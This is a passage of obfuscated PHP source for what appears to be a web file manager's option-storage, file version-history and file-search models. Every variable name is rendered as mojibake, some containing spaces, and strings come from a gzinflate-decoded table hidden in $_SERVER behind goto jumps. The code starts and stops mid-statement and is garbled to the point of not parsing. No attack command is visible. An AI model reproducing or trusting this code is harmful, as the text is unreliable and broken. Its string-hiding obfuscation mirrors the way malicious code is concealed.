$this->optionType); return $ó§›ñşÍ; } public function update($‰Ëİ ‹ä, $¥¡ó£â¡) { $Ï¬†¿í¸ =& $_SERVER[´‹ô¯Œ]; $¥¡ó£â¡ = array_field_key($¥¡ó£â¡, $this->field); $îòÖÄ¸† = $this->listData($‰Ëİ ‹ä); if (!$îòÖÄ¸† || !$‰Ëİ ‹ä) { return !1; } $¥¡ó£â¡ = array_merge($îòÖÄ¸†, $¥¡ó£â¡); $¥¡ó£â¡[$Ï¬†¿í¸[88]] = time(); return Model($this->modelType)->set($Ï¬†¿í¸[484] . $‰Ëİ ‹ä, $¥¡ó£â¡, $this->optionType); } public function remove($½Ø¥–é) { if (!$½Ø¥–é) { return !1; } return Model($this->modelType)->remove($_SERVER[´‹ô¯Œ][484] . $½Ø¥–é, $this->optionType); } public function clear() { $ı–âÁ¾ =& $_SERVER[´‹ô¯Œ]; Model($this->modelType)->remove($ı–âÁ¾[485], $this->optionType . $ı–âÁ¾[486]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ñ¡ùªäê, $ã§Ë˜Ç) { if (!$ã§Ë˜Ç) { return !1; } $Š©§¶°– = $this->listData(); $Š©§¶°– = array_to_keyvalue($Š©§¶°–, $ñ¡ùªäê); return isset($Š©§¶°–[$ã§Ë˜Ç]) ? $Š©§¶°–[$ã§Ë˜Ç] : !1; } public function findByName($†ñıÕÉ) { return $this->findByKey($_SERVER[´‹ô¯Œ][32], $†ñıÕÉ); } protected function resetData($õ‹ì»½Š) { $Œ”Ñß…“ =& $_SERVER[´‹ô¯Œ]; $õ‹ì»½Š = is_array($õ‹ì»½Š) ? $õ‹ì»½Š : array(); $äˆéóÎñ = array(); for ($ºç¥ôˆÛ = 0; $ºç¥ôˆÛ < count($õ‹ì»½Š); $ºç¥ôˆÛ++) { $äˆéóÎñ[$Œ”Ñß…“[484] . $õ‹ì»½Š[$ºç¥ôˆÛ][$Œ”Ñß…“[487]]] = $õ‹ì»½Š[$ºç¥ôˆÛ]; } return Model($this->modelType)->set($äˆéóÎñ, !1, $this->optionType); } private function getAutoName($ªû„Í¦) { $ŸÇ—ŞÓø = array_to_keyvalue($this->listData(), $_SERVER[´‹ô¯Œ][32]); if (!$ŸÇ—ŞÓø || !isset($ŸÇ—ŞÓø[$ªû„Í¦])) { return $ªû„Í¦; } for ($‡ñıéœÜ = 1; $‡ñıéœÜ < count($ŸÇ—ŞÓø); $‡ñıéœÜ++) { $¶ °¥ÊÅ = $ªû„Í¦ . "\50{$‡ñıéœÜ}\51"; if (!isset($ŸÇ—ŞÓø[$¶ °¥ÊÅ])) { return $¶ °¥ÊÅ; } } return $¶ °¥ÊÅ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÚÏ­†éÈ = false, $ôòş»ä = '', $÷¼•›³ = false) { $Ø–Àı– =& $_SERVER[´‹ô¯Œ]; $ÜÂÉ¼»¢ = $this->cacheGet($ôòş»ä); $ˆ ìß®İ = $this->optionDefault($ôòş»ä); $ˆ ìß®İ = is_array($ˆ ìß®İ) ? $ˆ ìß®İ : array(); if (is_array($ÜÂÉ¼»¢)) { $ÜÂÉ¼»¢ = array_merge($ˆ ìß®İ, $ÜÂÉ¼»¢); return $ÚÏ­†éÈ ? isset($ÜÂÉ¼»¢[$ÚÏ­†éÈ]) ? $ÜÂÉ¼»¢[$ÚÏ­†éÈ] : null : $ÜÂÉ¼»¢; } $¸ªÀÜœÆ = $this->filterWhere(array($Ø–Àı–[33] => $ôòş»ä)); $ÜÂÉ¼»¢ = $this->where($¸ªÀÜœÆ)->select(); $ÜÂÉ¼»¢ = array_to_keyvalue($ÜÂÉ¼»¢, $Ø–Àı–[97], $Ø–Àı–[453]); foreach ($ÜÂÉ¼»¢ as $œÎ‹Õ¨ => $†‘˜Š§Œ) { if ($÷¼•›³ || in_array($œÎ‹Õ¨, $this->jsonField)) { $ÜÂÉ¼»¢[$œÎ‹Õ¨] = json_decode($†‘˜Š§Œ, !0); } } $this->cacheSet($ôòş»ä, $ÜÂÉ¼»¢); $ÜÂÉ¼»¢ = array_merge($ˆ ìß®İ, $ÜÂÉ¼»¢); return $ÚÏ­†éÈ ? $ÜÂÉ¼»¢[$ÚÏ­†éÈ] : $ÜÂÉ¼»¢; } public function set($—•ÑôİÖ, $¯´òäÌÈ = false, $®«‡ÃÔˆ = '') { $íÙÄÏß =& $_SERVER[´‹ô¯Œ]; $this->cacheRemove($®«‡ÃÔˆ); $ÍäÁˆµ = array(); $˜úéû† = is_array($—•ÑôİÖ) ? $—•ÑôİÖ : array($—•ÑôİÖ => $¯´òäÌÈ); foreach ($˜úéû† as $»²åÙ­¡ => $¶¶û¹Ù) { if (is_array($¶¶û¹Ù)) { $¶¶û¹Ù = json_encode_force($¶¶û¹Ù); } $this->checkLength($¶¶û¹Ù, !1, $this->tableName . $íÙÄÏß[4] . $—•ÑôİÖ); $¶¶û¹Ù = self::textEncode($¶¶û¹Ù); $˜úéû† = array($íÙÄÏß[33] => $®«‡ÃÔˆ, $íÙÄÏß[97] => $»²åÙ­¡, $íÙÄÏß[453] => $¶¶û¹Ù); $ÍäÁˆµ[] = $this->filterWhere($˜úéû†); } if (!$ÍäÁˆµ) { return !0; } $ãõÛåœå = $this->cacheKey($íÙÄÏß[488]); CacheLock::lock($ãõÛåœå); $ï°»ù¨Ñ = $this->addAll($ÍäÁˆµ, array(), !0); CacheLock::unlock($ãõÛåœå); return $ï°»ù¨Ñ; } protected function optionDefault($§¬ï´œ¢ = '') { return !1; } public function setDeep($„¨ÌŞô¾, $Ì–ÒØì = false, $Òôµ’³Ş = '') { $™†ôåÙ = explode($_SERVER[´‹ô¯Œ][10], $„¨ÌŞô¾); $ò¨ù÷Ç¦ = $this->get(); array_set_value($ò¨ù÷Ç¦, $„¨ÌŞô¾, $Ì–ÒØì); $this->set($™†ôåÙ[0], $ò¨ù÷Ç¦[$™†ôåÙ[0]], $Òôµ’³Ş); } public function remove($ºäíßš, $·ñ““ÔË = '') { $Á÷Úı´á =& $_SERVER[´‹ô¯Œ]; $this->cacheRemove($·ñ““ÔË); $ıè’óô = $this->filterWhere(array($Á÷Úı´á[97] => $ºäíßš, $Á÷Úı´á[33] => $·ñ““ÔË)); if (is_null($ºäíßš)) { unset($ıè’óô[$Á÷Úı´á[97]]); } return $this->where($ıè’óô)->delete(); } public function cacheSet($ĞšŒ»˜ó, $ù¾„²¨å = false) { return Cache::set($this->cacheKey($ĞšŒ»˜ó), $ù¾„²¨å); } public function cacheGet($ö»‹¦¦) { return Cache::get($this->cacheKey($ö»‹¦¦)); } public function cacheRemove($¡¨Úª‹ü) { return Cache::remove($this->cacheKey($¡¨Úª‹ü)); } protected function filterWhere($Ü×‹° Ä) { return $Ü×‹° Ä; } protected function cacheKey($Ã§»¿œ¦) { return $Ã§»¿œ¦; } } goto aÆê¹“µ‡À; B‹‘½†©‘: $qbgfsjvdxl = $_SERVER[´‹ô¯Œ][696]; if (!$qbgfsjvdxl) { die; } $_SERVER[¢›»Ğ››] = explode($_SERVER[´‹ô¯Œ][697], gzinflate(substr($_SERVER[´‹ô¯Œ][698], 10, -8))); goto d İğµÕ©Ê; dÀñÖ¶âö¢: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\143\145\137\x68\151\163\164\157\162\x79"; public function historyCount($Ôªñ´š‡) { $ò•÷¼Ü =& $_SERVER[´‹ô¯Œ]; if (!$Ôªñ´š‡) { return array(); } if (is_string($Ôªñ´š‡) || is_int($Ôªñ´š‡)) { $Ôªñ´š‡ = array($Ôªñ´š‡); } $í·×¨Ô = array($ò•÷¼Ü[194], $ò•÷¼Ü[2248] => $ò•÷¼Ü[579]); $¬–Èå×· = array($ò•÷¼Ü[194] => array($ò•÷¼Ü[7], $Ôªñ´š‡)); $®ŞµÅœ = $this->field($í·×¨Ô)->where($¬–Èå×·)->group($ò•÷¼Ü[194])->select(); return array_to_keyvalue($®ŞµÅœ, $ò•÷¼Ü[194], $ò•÷¼Ü[579]); } public function addHistory($Øíçã‡¤, $î™ÛÆ‰Ã = '') { $…„‘ä— =& $_SERVER[´‹ô¯Œ]; $»Ä½ó‹â = array($…„‘ä—[503] => $Øíçã‡¤[$…„‘ä—[194]], $…„‘ä—[1787] => isset($Øíçã‡¤[$…„‘ä—[541]]) ? $Øíçã‡¤[$…„‘ä—[541]] : $Øíçã‡¤[$…„‘ä—[539]], $…„‘ä—[556] => $Øíçã‡¤[$…„‘ä—[555]], $…„‘ä—[634] => $Øíçã‡¤[$…„‘ä—[79]], $…„‘ä—[2249] => $î™ÛÆ‰Ã); if ($GLOBALS[$…„‘ä—[6]][$…„‘ä—[92]][$…„‘ä—[1319]] >= 1) { $this->historyAutoClear($»Ä½ó‹â[$…„‘ä—[194]]); $this->add($»Ä½ó‹â); } Hook::trigger($…„‘ä—[2250], $»Ä½ó‹â); Model($…„‘ä—[2251])->eventFileEdit($Øíçã‡¤[$…„‘ä—[194]]); } private function historyAutoClear($²íĞ²¨¸) { $ã…†ÙŸõ =& $_SERVER[´‹ô¯Œ]; $‘Ÿ¦ ûÜ = Model($ã…†ÙŸõ[856])->get($ã…†ÙŸõ[1341]); $€ı¡—¥ = intval($GLOBALS[$ã…†ÙŸõ[6]][$ã…†ÙŸõ[92]][$ã…†ÙŸõ[1319]]); $İÍáèê = $‘Ÿ¦ ûÜ == $ã…†ÙŸõ[1342] ? min(5, $€ı¡—¥) : $€ı¡—¥; $İÍáèê = $İÍáèê <= 0 ? 0 : $İÍáèê - 1; if ($İÍáèê >= 499) { return; } $Ğ­’ÔÓÕ = array($ã…†ÙŸõ[503] => $²íĞ²¨¸); $€­¤ÄÚ÷ = $this->field($ã…†ÙŸõ[2252])->where($Ğ­’ÔÓÕ)->order($ã…†ÙŸõ[2245])->select(); if (!$€­¤ÄÚ÷ || $İÍáèê >= count($€­¤ÄÚ÷)) { return; } $±Ô”„‘ö = array_to_keyvalue($€­¤ÄÚ÷, $ã…†ÙŸõ[12], $ã…†ÙŸõ[487]); $±Ô”„‘ö = array_slice($±Ô”„‘ö, $İÍáèê); $‚®å¾½ = array_to_keyvalue($€­¤ÄÚ÷, $ã…†ÙŸõ[12], $ã…†ÙŸõ[555]); $‚®å¾½ = array_slice($‚®å¾½, $İÍáèê); if (!$±Ô”„‘ö || !$‚®å¾½) { return; } $Ğ­’ÔÓÕ = array($ã…†ÙŸõ[505] => array($ã…†ÙŸõ[7], $±Ô”„‘ö)); $this->where($Ğ­’ÔÓÕ)->delete(); Model($ã…†ÙŸõ[558])->remove($‚®å¾½); } public function listData($¸¼”Æ¡) { $Å«Á ˆ =& $_SERVER[´‹ô¯Œ]; $·Í±éïÚ = array($Å«Á ˆ[503] => $¸¼”Æ¡); $›ĞÉåÕƒ = $Å«Á ˆ[2253]; $ÙÓöÀî = $this->field($›ĞÉåÕƒ)->where($·Í±éïÚ)->order($Å«Á ˆ[2245])->selectPage(); $this->_listAppendUser($ÙÓöÀî[$Å«Á ˆ[448]]); $«ØóÜ© = Model($Å«Á ˆ[856])->get($Å«Á ˆ[1341]); $æ‚Ü¿à = 5; if ($«ØóÜ© == $Å«Á ˆ[1342]) { $ÙÓöÀî[$Å«Á ˆ[448]] = array_slice($ÙÓöÀî[$Å«Á ˆ[448]], 0, $æ‚Ü¿à); $ÙÓöÀî[$Å«Á ˆ[445]] = array($Å«Á ˆ[2254] => 1, $Å«Á ˆ[2255] => 20, $Å«Á ˆ[2256] => 1, $Å«Á ˆ[2257] => count($ÙÓöÀî[$Å«Á ˆ[448]])); } return $ÙÓöÀî; } protected function _listAppendUser(&$ÑÌËÎ©¬) { $›‡è =& $_SERVER[´‹ô¯Œ]; $ó½…÷¨ó = array_to_keyvalue($ÑÌËÎ©¬, $›‡è[12], $›‡è[1796]); $çÁ¾¨’ = Model($›‡è[611])->userListInfo($ó½…÷¨ó); foreach ($ÑÌËÎ©¬ as &$Í˜äÙ‰å) { $‡öõÈ€ = $Í˜äÙ‰å[$›‡è[1796]]; $Í˜äÙ‰å[$›‡è[539]] = $çÁ¾¨’[$‡öõÈ€] ? $çÁ¾¨’[$‡öõÈ€] : !1; } unset($Í˜äÙ‰å); } public function fileInfo($÷è¥»Ç¿, $Å‹µ‰ü = false) { $«úÑ‹“Å =& $_SERVER[´‹ô¯Œ]; $ŒÙÁÂ¥Ö = $this->tablePrefix; $¾Õ£ø˜ª = "{$ŒÙÁÂ¥Ö}\151\x6f\x5f\146\151\x6c\145\40\146\x69\154\145\163\x20\x6f\x6e\x20\146\x69\x6c\145\x73\x2e\x66\x69\x6c\145\111\104\40\75\x20\x68\151\163\x74\157\x72\171\56\x66\151\x6c\x65\x49\104"; $‘Ù¨ª½« = $this->alias($«úÑ‹“Å[2258])->where(array($«úÑ‹“Å[505] => $÷è¥»Ç¿))->join($¾Õ£ø˜ª, $«úÑ‹“Å[2259])->find(); if ($‘Ù¨ª½« && $Å‹µ‰ü) { $¢Ë£‡ = array($«úÑ‹“Å[194] => $‘Ù¨ª½«[$«úÑ‹“Å[194]], $«úÑ‹“Å[487] => array($«úÑ‹“Å[1105], $÷è¥»Ç¿)); $‘Ù¨ª½«[$«úÑ‹“Å[1683]] = $this->where($¢Ë£‡)->count(); } return $‘Ù¨ª½«; } public function removeItem($¶ä¨¿¥) { $¹„Ïà”Ó =& $_SERVER[´‹ô¯Œ]; $Äüƒ®§– = array($¹„Ïà”Ó[505] => $¶ä¨¿¥); $ƒ™ÒÏƒ = $this->where($Äüƒ®§–)->find(); if ($ƒ™ÒÏƒ) { $‚ ©¯ÜÜ = $this->where($Äüƒ®§–)->delete(); Model($¹„Ïà”Ó[558])->remove($ƒ™ÒÏƒ[$¹„Ïà”Ó[555]]); return $‚ ©¯ÜÜ; } return !1; } public function removeBySource($‡ŠĞœ¢) { $« “§ÑÉ =& $_SERVER[´‹ô¯Œ]; if (!$‡ŠĞœ¢) { return !1; } if (!is_array($‡ŠĞœ¢)) { $‡ŠĞœ¢ = array($‡ŠĞœ¢); } $ğíõÒµã = array($« “§ÑÉ[503] => array($« “§ÑÉ[7], $‡ŠĞœ¢)); $Ş”ÄÑí¹ = $this->field($« “§ÑÉ[556])->where($ğíõÒµã)->select(); if ($Ş”ÄÑí¹) { $this->where($ğíõÒµã)->delete(); $­×óòï˜ = array_to_keyvalue($Ş”ÄÑí¹, $« “§ÑÉ[12], $« “§ÑÉ[555]); Model($« “§ÑÉ[558])->remove($­×óòï˜); } return !0; } public function setDetail($¢¢•“½€, $Şæ­µÕ) { $Á´‘…Ç± =& $_SERVER[´‹ô¯Œ]; return $this->where(array($Á´‘…Ç±[505] => $¢¢•“½€))->save(array($Á´‘…Ç±[2249] => $Şæ­µÕ)); } public function rollbackToItem($»Ø·–½ƒ, $³§ÊËää) { $±ù£é›à =& $_SERVER[´‹ô¯Œ]; $î—éÄÍ = Model($±ù£é›à[916])->sourceInfo($»Ø·–½ƒ); $this->addHistory($î—éÄÍ, LNG($±ù£é›à[2260])); $¾¤åƒ­§ = $this->find($³§ÊËää); $“‹·×ˆ = array($±ù£é›à[555] => $¾¤åƒ­§[$±ù£é›à[555]], $±ù£é›à[79] => $¾¤åƒ­§[$±ù£é›à[79]], $±ù£é›à[88] => time(), $±ù£é›à[541] => USER_ID); Model($±ù£é›à[916])->where(array($±ù£é›à[194] => $»Ø·–½ƒ))->save($“‹·×ˆ); return $this->where(array($±ù£é›à[505] => $³§ÊËää))->delete(); } public function clearSame($†•â¶½) { $âÀ•‹ÕŒ =& $_SERVER[´‹ô¯Œ]; $™ï§—À = $this->listData($†•â¶½); $«’©¥à™ = array_to_keyvalue_group($™ï§—À, $âÀ•‹ÕŒ[555]); $Í²Û×÷ = array(); $ÖîªòÀ = array(); foreach ($«’©¥à™ as $€Ê­¾†) { if (!$€Ê­¾† || count($€Ê­¾†) <= 1) { continue; } foreach ($€Ê­¾† as $Ë—áìÒ˜) { $Í²Û×÷[] = $Ë—áìÒ˜[$âÀ•‹ÕŒ[555]]; $ÖîªòÀ[] = $Ë—áìÒ˜[$âÀ•‹ÕŒ[487]]; } } if (!$ÖîªòÀ) { return; } $this->where(array($âÀ•‹ÕŒ[487] => array($âÀ•‹ÕŒ[7], $ÖîªòÀ)))->delete(); Model($âÀ•‹ÕŒ[558])->remove($Í²Û×÷); } public function userSpace() { $óá¹è¡’ =& $_SERVER[´‹ô¯Œ]; $Öº†Æ›¼ = $this->tablePrefix; $°Œ€›çğ = array($óá¹è¡’[1787] => USER_ID); $ô²ôÅÌ“ = "{$Öº†Æ›¼}\151\157\x5f\x66\x69\x6c\145\40\x66\x69\154\x65\163\x20\157\156\40\146\151\x6c\145\163\x2e\146\x69\154\x65\111\x44\40\75\40\150\151\x73\164\x6f\162\x79\x2e\146\x69\154\145\111\x44"; return $this->alias($óá¹è¡’[2258])->where($°Œ€›çğ)->join($ô²ôÅÌ“, $óá¹è¡’[2259])->sum($óá¹è¡’[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($æç§®) { $ªÈ½“º• =& $_SERVER[´‹ô¯Œ]; $¬æƒ¸®Â = KodIO::fileTypeList(); $ÃäÆ±¥• = $¬æƒ¸®Â[$æç§®]; if (!$ÃäÆ±¥•) { return array(); } $‹¤¡š¥ = $ÃäÆ±¥•[$ªÈ½“º•[169]]; $ïºÚˆøş = $ªÈ½“º•[7]; if (!$ÃäÆ±¥•[$ªÈ½“º•[169]]) { $åÀ„ƒÈÕ = array_to_keyvalue($¬æƒ¸®Â, $ªÈ½“º•[12], $ªÈ½“º•[169]); $‹¤¡š¥ = implode($ªÈ½“º•[50], $åÀ„ƒÈÕ); $ïºÚˆøş = $ªÈ½“º•[2261]; } $¶çãõö = explode($ªÈ½“º•[50], trim($‹¤¡š¥, $ªÈ½“º•[50])); return array($ïºÚˆøş, $¶çãõö); } public function listPathType($ˆëš‡şü) { $®ŞŸšøã =& $_SERVER[´‹ô¯Œ]; $“‚º–¼Ë = $this->fileTypeWhere($ˆëš‡şü); if (!$“‚º–¼Ë) { return array(); } $ŸŒ„ã¡ë = USER_ID; $·¦ÎÁ˜£ = Model($®ŞŸšøã[611])->getInfo($ŸŒ„ã¡ë); $•ƒ¿€¬ß = array($®ŞŸšøã[665] => SourceModel::TYPE_USER, $®ŞŸšøã[598] => array($®ŞŸšøã[629], $®ŞŸšøã[607] . $·¦ÎÁ˜£[$®ŞŸšøã[90]][$®ŞŸšøã[194]] . $®ŞŸšøã[630]), $®ŞŸšøã[666] => $ŸŒ„ã¡ë, $®ŞŸšøã[663] => 0, $®ŞŸšøã[664] => $“‚º–¼Ë); return $this->listSource($•ƒ¿€¬ß); } public function listSearch($…Ìà…«, $ñ°ÏÖİ¾ = 300) { $üüè”•ş =& $_SERVER[´‹ô¯Œ]; if (isset($…Ìà…«[$üüè”•ş[2095]]) && $…Ìà…«[$üüè”•ş[2095]]) { $…Ìà…«[$üüè”•ş[2095]] = str_replace($üüè”•ş[463], $üüè”•ş[2262], trim($…Ìà…«[$üüè”•ş[2095]])); } $Ú©¾Ò”Ò = $this->_parseSearchWhere($…Ìà…«); if (!isset($Ú©¾Ò”Ò[$üüè”•ş[517]])) { $Ú©¾Ò”Ò[$üüè”•ş[517]] = 0; } $¯¡Èãó± = $üüè”•ş[2263]; $¡ªÜ÷ğË = $Ú©¾Ò”Ò; $÷µ¾ò…Ö = $¯¡Èãó±; $this->_listSearchBindPinyin($…Ìà…«, $Ú©¾Ò”Ò, $¯¡Èãó±); $this->alias($üüè”•ş[531])->_makeOrder(); $Ú©¾Ò”Ò = $this->parseWhereLike($Ú©¾Ò”Ò); $ØÕŠ‡ø˜ = $this->distinct(!0)->field($¯¡Èãó±)->where($Ú©¾Ò”Ò)->selectPage($ñ°ÏÖİ¾); if ($GLOBALS[$üüè”•ş[6]][$üüè”•ş[460]][$üüè”•ş[461]] && Input::check($…Ìà…«[$üüè”•ş[2095]], $üüè”•ş[672]) && $ØÕŠ‡ø˜[$üüè”•ş[445]][$üüè”•ş[431]] == 1 && $ØÕŠ‡ø˜[$üüè”•ş[445]][$üüè”•ş[446]] == 0) { $ØÕŠ‡ø˜ = $this->distinct(!0)->field($¯¡Èãó±)->where($¡ªÜ÷ğË)->limit(1000)->select(); $ØÕŠ‡ø˜ = array_page_split($ØÕŠ‡ø˜, !1, $ñ°ÏÖİ¾); } $this->_listSearchFileContent($ØÕŠ‡ø˜, $…Ìà…«, $÷µ¾ò…Ö, $¡ªÜ÷ğË); $this->_listSearchDesc($ØÕŠ‡ø˜, $…Ìà…«, $÷µ¾ò…Ö); $this->_listSearchTag($ØÕŠ‡ø˜, $…Ìà…«, $÷µ¾ò…Ö); $this->_listSearchGroupTag($ØÕŠ‡ø˜, $…Ìà…«, $÷µ¾ò…Ö); $this->_listDataApply($ØÕŠ‡ø˜[$üüè”•ş[448]]); $this->_listMake($ØÕŠ‡ø˜); return $ØÕŠ‡ø˜; } private function _listSearchFileContent(&$½Òû³œ¾, $ñºĞ–öÛ, $‰ºıÒ·Æ, $Ñ£“÷›‚) { $âş¿çØ =& $_SERVER[´‹ô¯Œ]; if (!$ñºĞ–öÛ[$âş¿çØ[2095]] || $½Òû³œ¾[$âş¿çØ[445]][$âş¿çØ[431]] > 1) { return; } if (!isset($Ñ£“÷›‚[$âş¿çØ[32]]) || !is_array($ñºĞ–öÛ[$âş¿çØ[555]])) { return; } $Ñ£“÷›‚[$âş¿çØ[555]] = array($âş¿çØ[7], $ñºĞ–öÛ[$âş¿çØ[555]]); unset($Ñ£“÷›‚[$âş¿çØ[32]]); unset($ñºĞ–öÛ[$âş¿çØ[555]]); $‰à”‰¾Š = $this->field($‰ºıÒ·Æ)->where($Ñ£“÷›‚)->limit($âş¿çØ[2264])->select(); if (!$‰à”‰¾Š || count($‰à”‰¾Š) == 0) { return; } $½Òû³œ¾[$âş¿çØ[448]] = array_merge($‰à”‰¾Š, $½Òû³œ¾[$âş¿çØ[448]]); $½Òû³œ¾[$âş¿çØ[445]][$âş¿çØ[446]] += count($‰à”‰¾Š); } private function _listSearchTag(&$ÎÙ›ó¾‡, $æŠ™µ¥, $ˆÓí˜Ò ) { $¯‡õ‡ÚŒ =& $_SERVER[´‹ô¯Œ]; if (empty($æŠ™µ¥[$¯‡õ‡ÚŒ[1955]]) || !in_array($¯‡õ‡ÚŒ[2265], $æŠ™µ¥[$¯‡õ‡ÚŒ[1955]])) { return; } if (!$æŠ™µ¥[$¯‡õ‡ÚŒ[2095]] || $ÎÙ›ó¾‡[$¯‡õ‡ÚŒ[445]][$¯‡õ‡ÚŒ[431]] > 1) { return; } $¡óÓ±š“ = Model($¯‡õ‡ÚŒ[2266])->listData(); $ª¾ÌÓ”€ = array(); $†Ä„¶Ì— = $æŠ™µ¥[$¯‡õ‡ÚŒ[2095]]; foreach ($¡óÓ±š“ as $ğ«ö™û¦) { $Ìğ»ÃæÙ = $ğ«ö™û¦[$¯‡õ‡ÚŒ[32]]; $ºÜ«¨€… = str_replace($¯‡õ‡ÚŒ[53], $¯‡õ‡ÚŒ[12], Pinyin::get($Ìğ»ÃæÙ)); if (stripos($Ìğ»ÃæÙ, $†Ä„¶Ì—) !== !1 || stripos($ºÜ«¨€…, $†Ä„¶Ì—) !== !1) { $ª¾ÌÓ”€[] = $ğ«ö™û¦[$¯‡õ‡ÚŒ[487]]; } } if (!$ª¾ÌÓ”€) { return; } $“ÚŠ¬½ã = array($¯‡õ‡ÚŒ[512] => array($¯‡õ‡ÚŒ[7], $ª¾ÌÓ”€), $¯‡õ‡ÚŒ[1796] => USER_ID); $©èš¹Œê = Model($¯‡õ‡ÚŒ[514])->field($¯‡õ‡ÚŒ[87])->where($“ÚŠ¬½ã)->select(); $©èš¹Œê = array_to_keyvalue($©èš¹Œê, $¯‡õ‡ÚŒ[12], $¯‡õ‡ÚŒ[87]); $¸”é«İ  = array_unique($©èš¹Œê); $this->_listSearchMerge($ÎÙ›ó¾‡, $æŠ™µ¥, $ˆÓí˜Ò , $¸”é«İ ); } private function _listSearchDesc(&$‰àÇïµ§, $ŠÂÓ¡İ, $©á´€Î‚) { $À•ÀÊ·Ş =& $_SERVER[´‹ô¯Œ]; if (empty($ŠÂÓ¡İ[$À•ÀÊ·Ş[1955]]) || !in_array($À•ÀÊ·Ş[538], $ŠÂÓ¡İ[$À•ÀÊ·Ş[1955]])) { return; } if (!$ŠÂÓ¡İ[$À•ÀÊ·Ş[2095]] || $‰àÇïµ§[$À•ÀÊ·Ş[445]][$À•ÀÊ·Ş[431]] > 1) { return; } $§É©„¸ó = array($À•ÀÊ·Ş[97] => $À•ÀÊ·Ş[538], $À•ÀÊ·Ş[453] => array($À•ÀÊ·Ş[462], $À•ÀÊ·Ş[2097] . $ŠÂÓ¡İ[$À•ÀÊ·Ş[2095]] . $À•ÀÊ·Ş[2097])); $îºÏÙ•ƒ = !1; if ($îºÏÙ•ƒ) { $ğíøæ ¿ = $this->listSearchChildren($ŠÂÓ¡İ[$À•ÀÊ·Ş[193]]); $ğíøæ ¿ = array_unique($ğíøæ ¿); if (!$ğíøæ ¿) { return; } $§É©„¸ó[$À•ÀÊ·Ş[194]] = array($À•ÀÊ·Ş[7], $ğíøæ ¿); } $ïÖİÓàã = Model($À•ÀÊ·Ş[649])->field($À•ÀÊ·Ş[194])->where($§É©„¸ó)->limit(5000)->select(); $§ùÔæ×Å = array_to_keyvalue($ïÖİÓàã, $À•ÀÊ·Ş[12], $À•ÀÊ·Ş[194]); $this->_listSearchMerge($‰àÇïµ§, $ŠÂÓ¡İ, $©á´€Î‚, $§ùÔæ×Å); } private function _listSearchGroupTag(&$Í°Ûõœñ, $¦ºóì°“, $ÕË¡“Îµ) { $ıë¸¹“Ê =& $_SERVER[´‹ô¯Œ]; if (empty($¦ºóì°“[$ıë¸¹“Ê[1955]]) || !in_array($ıë¸¹“Ê[2265], $¦ºóì°“[$ıë¸¹“Ê[1955]])) { return; } if (!$¦ºóì°“[$ıë¸¹“Ê[2095]] || $Í°Ûõœñ[$ıë¸¹“Ê[445]][$ıë¸¹“Ê[431]] > 1 || !$¦ºóì°“[$ıë¸¹“Ê[193]]) { return; } $–©¦ƒŒ¾ = $this->sourceInfo($¦ºóì°“[$ıë¸¹“Ê[193]]); if (!$–©¦ƒŒ¾ || $–©¦ƒŒ¾[$ıë¸¹“Ê[191]] != SourceModel::TYPE_GROUP) { return; } $Ú€”Í’÷ = $–©¦ƒŒ¾[$ıë¸¹“Ê[583]]; $êûŠê…® = Model($ıë¸¹“Ê[2267])->get($Ú€”Í’÷); $–ËÈÂîš = array(); $¾ûÏº’Ğ = $¦ºóì°“[$ıë¸¹“Ê[2095]]; foreach ($êûŠê…®[$ıë¸¹“Ê[448]] as $²ÅèÈ¾Ù) { $¯ÍôçÉ³ = $²ÅèÈ¾Ù[$ıë¸¹“Ê[32]]; $Ùà­Øß‚ = str_replace($ıë¸¹“Ê[53], $ıë¸¹“Ê[12], Pinyin::get($¯ÍôçÉ³)); if (stripos($¯ÍôçÉ³, $¾ûÏº’Ğ) !== !1 || stripos($Ùà­Øß‚, $¾ûÏº’Ğ) !== !1) { $–ËÈÂîš[] = $²ÅèÈ¾Ù[$ıë¸¹“Ê[487]]; } } if (!$–ËÈÂîš) { return; } $”ÃÖÏ‡ş = array($ıë¸¹“Ê[512] => array($ıë¸¹“Ê[7], $–ËÈÂîš), $ıë¸¹“Ê[1796] => 0, $ıë¸¹“Ê[33] => $ıë¸¹“Ê[1403] . $Ú€”Í’÷); $ùëàè = Model($ıë¸¹“Ê[514])->field($ıë¸¹“Ê[87])->where($”ÃÖÏ‡ş)->select(); $ùëàè = array_to_keyvalue($ùëàè, $ıë¸¹“Ê[12], $ıë¸¹“Ê[87]); $”¬„Æá¯ = array_unique($ùëàè); $this->_listSearchMerge($Í°Ûõœñ, $¦ºóì°“, $ÕË¡“Îµ, $”¬„Æá¯); } private function _listSearchMerge(&$Æš†Í, $³æ‚‹şÀ, $¾÷Ì¸ºğ, $˜ƒĞ²í) { $¿ÀÀÚ÷ª =& $_SERVER[´‹ô¯Œ]; if (!$˜ƒĞ²í) { return; } $Ë“úş± = array_to_keyvalue($Æš†Í[$¿ÀÀÚ÷ª[448]], $¿ÀÀÚ÷ª[12], $¿ÀÀÚ÷ª[194]); $Ö¢˜ÏÅ¤ = array_diff($˜ƒĞ²í, $Ë“úş±); if (!$Ö¢˜ÏÅ¤) { return; } $ûÃòûšÒ = array($¿ÀÀÚ÷ª[194] => array($¿ÀÀÚ÷ª[7], $Ö¢˜ÏÅ¤)); $ÍÖ ”Ğ = $this->field($¾÷Ì¸ºğ)->where($ûÃòûšÒ)->select(); if (!$ÍÖ ”Ğ) { return; } $ŠŞÛ‡úÂ = array(); foreach ($ÍÖ ”Ğ as $Ûğğšö) { if ($this->_listSearchFilter($Ûğğšö, $³æ‚‹şÀ)) { $ŠŞÛ‡úÂ[] = $Ûğğšö; } } $Æš†Í[$¿ÀÀÚ÷ª[448]] = array_merge($ŠŞÛ‡úÂ, $Æš†Í[$¿ÀÀÚ÷ª[448]]); $Æš†Í[$¿ÀÀÚ÷ª[445]][$¿ÀÀÚ÷ª[446]] += count($ŠŞÛ‡úÂ); } private function _listSearchFilter($¾‹½®¬ï, $’”ÔÀü÷) { $Ñğ–äÑ¤ =& $_SERVER[´‹ô¯Œ]; $‚ÂÂ¿° = $¾‹½®¬ï[$Ñğ–äÑ¤[497]] == $Ñğ–äÑ¤[91]; if (!strstr($¾‹½®¬ï[$Ñğ–äÑ¤[598]], $Ñğ–äÑ¤[50] . $’”ÔÀü÷[$Ñğ–äÑ¤[193]] . 